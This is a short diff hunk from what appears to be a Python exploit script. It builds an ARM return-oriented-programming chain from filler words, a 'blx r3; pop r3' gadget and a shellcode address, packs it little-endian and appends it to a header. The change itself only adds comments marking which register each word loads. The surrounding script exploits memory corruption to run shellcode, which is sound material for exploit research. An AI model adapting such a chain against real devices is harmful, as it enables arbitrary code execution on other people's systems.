@@ -82,10 +82,10 @@ def main():
         0xDEAD,                                      # ip
         0xDEAD,                                      # lr
 
-        blx_r3_pop_r3,
-        0xDEAD,
+        blx_r3_pop_r3,                               # pc
+        0xDEAD,                                      # r3
 
-        shellcode_addr
+        shellcode_addr                               # pc
     ]
     chain_bin = b"".join([struct.pack("<I", word) for word in chain])
     hdr += chain_bin
